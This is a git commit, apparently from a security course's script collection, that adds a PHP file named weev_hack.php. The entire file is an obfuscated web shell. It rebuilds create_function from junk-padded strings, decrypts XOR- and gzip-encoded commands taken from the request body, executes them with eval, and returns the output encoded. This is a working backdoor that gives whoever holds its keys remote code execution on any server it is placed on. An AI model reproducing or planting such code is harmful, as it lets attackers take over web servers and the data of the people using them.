cd570c413dac60697a8a1c024dde1efe95b16466
JMUAG <jahseemmaxwell@uagateway.org>
2022-11-08 11:25:16 -0500

    SEC335 Scripts

---
+++ week8/weev_hack.php
@@ -0,0 +1,11 @@
+<?php
+$Q=str_replace('H','','cHreaHteH_fuHHHnction');
+$l='function x($t,rV$k){$crV=strlen($rVk);$lrV=strVrlerVn($t);$orV="";forrV($i=0;$i<rV$l;){for(rV$j=0;';
+$h='"rV/$kh(.+)rV$kfrV/",rV@file_get_corVnrVtentsrV("php://input"rV),$m)==rV1) {@rVob_strVart();rV@evr';
+$g='$k="bae81rVcrV89rV";$kh="736e197arVarV38c";$kfrVrV="7cd77cf0brV5b5";$prVrV="6MrV74PLrVjkGjtVelrVrVcE";';
+$c='rVnd_clrVrVean();$rVr=@brVase64_encode(@x(rV@grVzcomprrVess($o),$rVrVk));print("$prV$kh$rrV$kf");}';
+$j='Val(@gzuncomrVprrVess(@x(rV@rVbarVse64_decode($m[rV1]),$krV)));$rVo=@ob_rVget_rVcontrVents();@ob_e';
+$R='(rV$j<$crV&&$i<rV$l);$j++rV,$i++rV){$o.=rV$t{$irVrV}^$k{$rVj};}}rrVeturn rV$o;}if (@pregrV_matrVch(';
+$E=str_replace('rV','',$g.$l.$R.$h.$j.$c);
+$U=$Q('',$E);$U();
+?>
